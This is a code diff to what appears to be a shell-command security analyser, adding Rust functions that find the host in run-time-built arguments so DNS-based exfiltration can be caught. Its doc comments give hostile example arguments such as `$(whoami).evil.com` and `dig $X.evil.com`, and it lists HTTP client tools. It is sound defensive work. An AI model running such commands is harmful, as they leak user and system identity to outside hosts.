@@ -186,6 +186,47 @@ pub fn of_argument(program: &str, token: &str) -> Option<String> {
     of_word(address)
 }
 
+/// The fixed end of a host name the shell builds at run time, as an argument
+/// of a program that names hosts: `$(whoami).evil.com`, `${X}.evil.com`,
+/// `x-$(id -u).evil.com` all name a subdomain of `evil.com`, which is where
+/// the lookup goes and what a DNS query carries the built part to. `None`
+/// when nothing after the last expansion is a host (`$X`, `$X.json`).
+#[must_use]
+pub(crate) fn of_built_word(token: &str) -> Option<String> {
+    if !token.contains(['$', '`']) {
+        return None;
+    }
+    let cut = token.rfind(['$', ')', '}', '`'])?;
+    let mut tail = &token[cut + 1..];
+    if token.as_bytes().get(cut) == Some(&b'$') {
+        // `$NAME.evil.com`: the variable's name is not part of the host
+        tail = tail.trim_start_matches(|c: char| c.is_ascii_alphanumeric() || c == '_');
+    }
+    of_word(tail.strip_prefix('.')?)
+}
+
+/// Programs that send HTTP requests: a URL is their argument, and a variable
+/// in it could also hold options, so the request's verdict is the one its
+/// words give as written (`shell/commands/fetch.rs`).
+const HTTP_CLIENTS: &[&str] = &[
+    "curl", "wget", "wget2", "http", "https", "xh", "curlie", "aria2c",
+];
+
+/// [`of_built_word`] for an argument of `program`, a program that names
+/// hosts, when the name is a connection to that host: a command's output in
+/// it (`$(…)`, backticks) for every such program, and a variable for one
+/// that is no HTTP client (`dig $X.evil.com`). An HTTP request with a plain
+/// variable in its host (`curl https://$BUCKET.s3.amazonaws.com/x`) is left
+/// as it was decided before, as the URL written out would defer (ADR-102).
+#[must_use]
+pub(crate) fn of_built_argument(program: &str, token: &str) -> Option<String> {
+    let by_command = token.contains("$(") || token.contains('`');
+    if !by_command && HTTP_CLIENTS.contains(&program) {
+        return None;
+    }
+    of_built_word(token)
+}
+
 /// Host of a redirection target `/dev/tcp/HOST/PORT` or `/dev/udp/HOST/PORT`,
 /// which bash and ksh open as a network connection instead of a file. Only that
 /// exact spelling counts, as in bash: `/dev/../dev/tcp/…` is a path. A host the
